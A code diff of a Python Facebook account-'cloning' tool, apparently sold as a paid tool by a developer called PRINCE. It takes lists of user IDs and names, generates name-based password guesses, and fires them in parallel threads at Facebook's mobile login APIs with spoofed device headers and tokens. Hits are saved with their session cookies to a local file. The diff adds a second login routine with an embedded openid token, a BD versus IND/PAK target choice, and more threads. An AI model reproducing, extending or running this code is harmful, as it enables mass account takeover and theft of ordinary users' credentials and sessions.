@@ -16,7 +16,6 @@ from rich import print
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
-
 from io import BytesIO
 import os
 import random
@@ -38,15 +37,13 @@ version = "  v1"
 # get system data
 
 class sort:
-    
+
     def line():
         return "[b dark_sea_green2]━" * 37
 
-    
     def clear():
         os.system("clear")
 
-    
     def logo():
         aci = f'''        //   ) )                                      
        //___/ /  __     ( )   __      ___      ___    
@@ -55,7 +52,6 @@ class sort:
     //       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]PAID[/r]\n{sort.line()}'''
         print(aci)
 
-    
     def color():
         co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
         cx = random.choice(co)
@@ -283,7 +279,6 @@ except Exception as e:
     sys.exit()
 
 
-
 def Samsung():
     Anderson = random.choice(["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5",
                               "4.4.2", "5.1.1", "6.0.1", "9.0.1"])
@@ -369,10 +364,6 @@ shuffled_cid = shuffle_string(ran_string)
 random_string = generate_random_string(lowercase_count, numeric_count)
 shuffled_connection_token = shuffle_string(random_string)
 
-
-
-
-
 oks = []
 loop = 0
 
@@ -435,54 +426,53 @@ def file_sub(uid, pwx, name, meth, fl):
                 useragent = uax
                 model = uax.split("FBDV/")[1].split(";")[0]
             data = {
-            "adid": adi,
-            "format": "json",
-            "device_id": adi,
-            "cpl": "true",
-            "family_device_id": str(uuid.uuid4()),
-            "credentials_type": "device_based_login_password",
-            "error_detail_type": "button_with_disabled",
-            "source": "device_based_login",
-            "email": uid,
-            "password": ps,
-            "access_token": token,
-            "generate_session_cookies": "1",
-            "meta_inf_fbmeta": "",
-            "advertiser_id": str(uuid.uuid4()),
-            "currently_logged_in_userid": "0",
-            "locale": "en_GB",
-            "client_country_code": "GB",
-            "method": "auth.login",
-            "fb_api_req_friendly_name": "authenticate",
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-            "api_key": "882a8490361da98702bf97a021ddc14d"}
+                "adid": adi,
+                "format": "json",
+                "device_id": adi,
+                "cpl": "true",
+                "family_device_id": str(uuid.uuid4()),
+                "credentials_type": "device_based_login_password",
+                "error_detail_type": "button_with_disabled",
+                "source": "device_based_login",
+                "email": uid,
+                "password": ps,
+                "access_token": token,
+                "generate_session_cookies": "1",
+                "meta_inf_fbmeta": "",
+                "advertiser_id": str(uuid.uuid4()),
+                "currently_logged_in_userid": "0",
+                "locale": "en_GB",
+                "client_country_code": "GB",
+                "method": "auth.login",
+                "fb_api_req_friendly_name": "authenticate",
+                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                "api_key": "882a8490361da98702bf97a021ddc14d"}
             head = {
-            'User-Agent': useragent,
-            'Accept': '*/*',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Host': 'graph.facebook.com',
-            'Connection':'close',
-            'cache-control': 'no-cache',
-            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
-            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-            'X-FB-Connection-Type': 'WIFI',
-            'X-Tigon-Is-Retry': 'False',
-            'X-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid={shuffled_cid}',
-            'X-fb-device-group': str(random.randint(2000, 4000)),
-            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags': 'graphservice',
-            'X-FB-HTTP-Engine': 'Liger',
-            'X-FB-Client-IP': 'True',
-            'X-FB-Server-Cluster': 'True',
-            'X-fb-connection-token': f'{shuffled_connection_token}',}
-            url= 'https://graph.facebook.com/auth/login'
-            
-            
+                'User-Agent': useragent,
+                'Accept': '*/*',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'Connection': 'close',
+                'cache-control': 'no-cache',
+                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
+                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                'X-FB-Connection-Type': 'WIFI',
+                'X-Tigon-Is-Retry': 'False',
+                'X-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid={shuffled_cid}',
+                'X-fb-device-group': str(random.randint(2000, 4000)),
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'X-fb-connection-token': f'{shuffled_connection_token}', }
+            url = 'https://graph.facebook.com/auth/login'
+
             rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
             if "session_key" in rq:
                 coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
-                print(f"\r\r[b r green_yellow][PRINCE-OK]     [/b r green_yellow][b chartreuse1]    {uid}|{ps}")
+                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]    {uid}|{ps}")
                 open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 oks.append(uid)
 
@@ -491,10 +481,136 @@ def file_sub(uid, pwx, name, meth, fl):
                 print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]    {uid}|{ps}")
                 open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
                 oks.append(uid)
-                
+
                 break
             else:
                 continue
+    except Exception as e:
+        time.sleep(30)
+    finally:
+        loop += 1
+
+
+def file_subind(uid, pwx, name, meth, fl):
+    global oks, loop
+    try:
+        if meth in ["a", "A", "1"]:
+            uax = ua[0]
+        elif meth in ["b", "B", "2"]:
+            uax = ua[1]
+        elif meth in ["c", "C", "3"]:
+            uax = ua[2]
+        elif meth in ["d", "D", "4"]:
+            uax = ua[3]
+        elif meth in ["e", "E", "5"]:
+            uax = ua[4]
+        elif meth in ["f", "F", "6"]:
+            uax = ua[5]
+        elif meth in ["g", "G", "7"]:
+            uax = ua[6]
+        else:
+            uax = ua[7]
+
+        sys.stdout.write(
+            f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(fl))}  • {str(len(oks))}\r\r"),
+        sys.stdout.flush()
+        First = name.split(" ")[0]
+        try:
+            Last = name.split(" ")[1]
+        except:
+            Last = "khan"
+        for pw in pwx:
+            ps = pw.replace("first", First.lower()).replace("First", First).replace("last", Last.lower()).replace(
+                "Last", Last).replace("Name", name).replace("name", name.lower()).replace("FIRST",
+                                                                                          First.upper()).replace(
+                "LAST", Last.upper())
+
+            token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
+            adi = str(uuid.uuid4())
+            try:
+                rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
+                device = uax.split("FBDV/")[1].split(";")[0]
+                plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
+                                      "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
+                fban = uax.split("FBAN/")[1].split(";")[0]
+                fbpn = uax.split("FBPN/")[1].split(";")[0]
+                fbav = uax.split("FBAV/")[1].split(";")[0]
+                fbbd = uax.split("FBBD/")[1].split(";")[0]
+                model = dd(fbbd, device)
+                fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
+                    random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
+                androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
+                    random.choice(["2", "1", "0"]))
+                nowandroidv = uax.split("Android ")[1].split(";")[0]
+                useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
+                    nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
+                    fbav, fbverson).replace(device, model)
+            except:
+                useragent = uax
+                model = uax.split("FBDV/")[1].split(";")[0]
+            with requests.Session() as session:
+                data = {"adid": adi,
+                        "format": "json",
+                        "device_id": adi,
+                        "cpl": "true",
+                        "family_device_id": adi,
+                        "secure_family_device_id": adi,
+                        "credentials_type": "device_based_login_password",
+                        "error_detail_type": "button_with_disabled",
+                        "source": "account_recovery",
+                        'sim_serials': "['80973453345210784798']",
+                        'openid_flow': 'android_login',
+                        'openid_provider': 'google',
+                        "email": uid,
+                        "password": ps,
+                        "access_token": token,
+                        "generate_session_cookies": "1",
+                        "meta_inf_fbmeta": "V2_UNTAGGED",
+                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+                        "advertiser_id": adi,
+                        "currently_logged_in_userid": "0",
+                        "locale": "en_US",
+                        "client_country_code": "US",
+                        "method": "auth.login",
+                        "fb_api_req_friendly_name": "authenticate",
+                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
+                        "api_key": "882a8490361da98702bf97a021ddc14d"}
+                content_lenght = "&".join(["%s=%s" % (key, value) for key, value in data.items()])
+                headers = {'User-Agent': useragent,
+                           'Content-Type': 'application/x-www-form-urlencoded',
+                           'x-fb-Connection-Type': 'MOBILE.LTE',
+                           'Accept': '*/*',
+                           'Host': 'graph.facebook.com',
+                           'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                           'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                           'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
+                           'Priority': 'u=3,i',
+                           'Zero-Rated': '0',
+                           'X-Fb-Connection-Quality': 'GOOD',
+                           'X-FB-Friendly-Name': 'authenticate',
+                           'X-FB-Request-Analytics-Tags': 'graphservice',
+                           'X-Fb-Device-Group': '5120',
+                           'X-FB-HTTP-Engine': 'Liger',
+                           'X-FB-Client-IP': 'True',
+                           'X-FB-Server-Cluster': 'True',
+                           'Content-Length': str(len(content_lenght))}
+                q = session.post("https://b-api.facebook.com/auth/login", data=data, headers=headers,
+                                 allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
+                    princeb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/",
+                                                                                                                "-");
+                    cookie = f"sb={princeb};{ckkk}"
+                    print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]    {uid}|{ps}")
+                    open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + cookie + "\n")
+                    oks.append(uid)
+
+                    break
+
+                elif 'www.facebook.com' in q['error']['message']:
+                    pass
+                else:
+                    continue
     except Exception as e:
         time.sleep(30)
     finally:
@@ -506,7 +622,9 @@ def filee():
     pwx = []
     sort.clear()
     sort.logo()
-    print("[b]    [red1]✗ [chartreuse1] [spring_green1]BD/IND FILE Clone")
+    print("[b]    [red1]Option 1 [chartreuse1] [spring_green1]BD FILE Clone")
+    print("[b]    [red1]Option 2 [chartreuse1] [spring_green1]IND/PAK FILE Clone")
+    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m -> \x1b[38;0;196m ")
     print(sort.line())
     print("[b] [chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] "
           "/sdcard/id.txt")
@@ -523,7 +641,7 @@ def filee():
     for i in range(int(limit)):
         print(
             " [b] [chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
-        passw = str(input(f" \x1b[38;1;198m  \x1b[38;5;155mPass No-{i+1} Add Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
+        passw = str(input(f" \x1b[38;1;198m  \x1b[38;5;155mPass No-{i + 1} Add Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
         if passw not in pwx:
             pwx.append(passw)
         print(sort.line())
@@ -538,7 +656,7 @@ def filee():
     print(sort.line())
     meth = str(input("  \x1b[38;1;198mΠ\x1b[38;5;155mCHOICE  \x1b[38;5;196m-> \x1b[1;97m   "))
     print(sort.line())
-    with ThreadPool(max_workers=30) as sub:
+    with ThreadPool(max_workers=40) as sub:
         sort.clear()
         print(sort.logo())
         print(
@@ -548,7 +666,10 @@ def filee():
             for xd in fl:
                 uid = xd.split("|")[0]
                 name = xd.split("|")[1]
-                sub.submit(file_sub, uid, pwx, name, meth, fl)
+                if ask in ["1", "a", "A", "01"]:
+                    sub.submit(file_sub, uid, pwx, name, meth, fl)
+                else:
+                    sub.submit(file_subind, uid, pwx, name, meth, fl)
 
         except:
             pass
@@ -559,8 +680,6 @@ def filee():
     sys.exit()
 
 
-
-
 def ran():
     user = []
     sort.clear()
@@ -568,7 +687,7 @@ def ran():
     print("[b]    [red1][A] [sea_green2]IND Number Clone")
     print("[b]    [red1][B] [spring_green1]BD Number Clone")
     print(sort.line())
-    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
+    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m -> \x1b[38;0;196m ")
     if ask in ["1", "01", "a", "A"]:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND Number")
         print(sort.line())
@@ -763,7 +882,7 @@ def login(uid, meth):
             else:
                 agent = Samsung()
             headers = {
-                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
+                "x-fb-connection-bandwidth": str(random.randint(200000000, 300000000)),
                 "x-fb-sim-hni": str(random.randint(20000, 40000)),
                 "x-fb-net-hni": str(random.randint(20000, 40000)),
                 "x-fb-connection-quality": "EXCELLENT",
@@ -829,7 +948,7 @@ def approve():
 
         print("your Key ->   " + showkey)
         input("This is paid tool bro. If you want to buy press enter. ")
-        tks = (f'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey)
+        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey)
         os.system('am start https://wa.me/+8801617687239?text=' + tks)
         sys.exit()
 
